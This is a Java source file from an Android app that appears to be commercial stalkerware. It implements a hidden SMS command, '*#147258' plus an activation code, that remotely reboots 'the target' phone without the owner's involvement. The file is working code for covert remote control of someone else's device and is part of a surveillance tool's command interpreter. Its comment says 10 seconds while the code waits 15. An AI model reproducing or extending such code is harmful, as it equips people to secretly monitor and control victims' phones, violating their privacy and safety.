package com.fx.dalvik.smscommand.interpreter;

import android.content.Context;
import android.os.SystemClock;

import com.fx.daemon.DaemonHelper;
import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.maind.ref.Customization;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;

public class SmsRestart {
	
	private static final String TAG = "SmsRestart";
 	private static final boolean LOGV = Customization.VERBOSE;
	
	public static final String COMMAND_ID = "*#147258";
	
	// Restart the target
	// <*#147258><FK>
	public static String processCommand(final Context context, String[] tokens) {
		if (LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens));
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(context, tokens[1]);
		
		if (!activationCodeValidation.equals(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		// Restart the target in 10 seconds
		Thread t = new Thread() {
			public void run() {
				FxLog.d(TAG, "Restart the target in 15 seconds ...");
				SystemClock.sleep(15000);
				
				FxLog.d(TAG, "Restart device...");
				DaemonHelper.rebootDevice(context);
			}
		};
		t.start();
		
		return FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK;
	}

}
